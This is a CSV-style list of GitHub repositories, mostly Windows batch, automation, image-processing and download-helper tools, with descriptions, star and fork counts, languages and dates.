lingxiaoyiyu-hub/grok-register-win,https://github.com/lingxiaoyiyu-hub/grok-register-win,Windows 下双击即用的 Grok（xAI）账号自动注册面板 - 浏览器自动化注册、SSO→CPA 转换、多邮箱源支持、多格式导出,93,26,Python,2026-07-14T06:22:52Z,2026-08-04T09:21:09Z
Sidneys1/BatchImageProcessor,https://github.com/Sidneys1/BatchImageProcessor,A Mass Image Processing tool for Windows,89,16,C#,2015-03-30T20:20:37Z,2026-03-22T12:58:41Z
leongrdic/wsl-alias,https://github.com/leongrdic/wsl-alias,create aliases for Linux commands in Windows command line (for WSL),86,7,Shell,2017-09-28T09:21:42Z,2026-03-12T10:53:18Z
VVFGAA/BreventBat,https://github.com/VVFGAA/BreventBat,,81,8,Batchfile,2019-04-05T17:40:50Z,2026-07-23T21:08:03Z
hashhar/Windows-Hacks,https://github.com/hashhar/Windows-Hacks,"This repository contains registry scripts, batch files and some knowledge to help you make your Windows do awesome stuff (at least by my standards).",78,13,PowerShell,2015-10-09T09:27:52Z,2026-06-30T18:20:40Z
xanderfrangos/crushee,https://github.com/xanderfrangos/crushee,Desktop tool for batch image optimization and resizing. Available for Windows and Mac. Built with Electron and Node.js.,78,15,JavaScript,2019-03-18T13:57:48Z,2026-08-03T15:41:23Z
ritchielawrence/batchfunctionlibrary,https://github.com/ritchielawrence/batchfunctionlibrary,Library of Windows batch functions,77,18,HTML,2016-06-15T09:30:15Z,2026-05-11T16:08:41Z
Mario-Hero/toolUnRar,https://github.com/Mario-Hero/toolUnRar,用Python批量解压带密码的压缩包 A Python script for batch extraction with passwords,76,17,Python,2021-04-04T13:51:09Z,2026-04-05T00:50:27Z
StefanTraistaru/batch-export,https://github.com/StefanTraistaru/batch-export,Inkscape extension that allows you to export each layer into a single file.,71,9,Python,2020-08-16T16:10:38Z,2026-06-20T04:33:48Z
EbolaMan-YT/custom-cmd,https://github.com/EbolaMan-YT/custom-cmd,,55,11,Batchfile,2023-02-28T23:24:20Z,2026-08-02T15:15:59Z
SegoCode/DebloBat,https://github.com/SegoCode/DebloBat,"⚙️ Yet another (and ugly) debloat, optimizer and tweaker for Windows 11 based on group policies",50,4,Batchfile,2022-02-10T10:02:10Z,2026-07-08T02:35:48Z
dubbyOW/BCDEditTweaks,https://github.com/dubbyOW/BCDEditTweaks,.cmd script for enhancing Windows performance through optimized BCDEdit parameters.,50,5,Batchfile,2024-06-30T12:22:45Z,2026-07-14T04:48:43Z
LennoC/N_m3u8DL-RE_SimpleBatGUI,https://github.com/LennoC/N_m3u8DL-RE_SimpleBatGUI,简单的批处理调用N_m3u8DL-RE进行下载，预设单个下载、批量下载、录播下载。,50,11,Batchfile,2023-07-31T09:23:18Z,2026-07-28T13:55:27Z
edinsuta/yt-dlp-batch,https://github.com/edinsuta/yt-dlp-batch,Simple batch files for simplifying basic usage of https://github.com/yt-dlp/yt-dlp (a fork of https://github.com/rg3/youtube-dl) Windows .exe releases,50,3,Batchfile,2021-12-23T13:56:56Z,2026-07-19T03:58:44Z
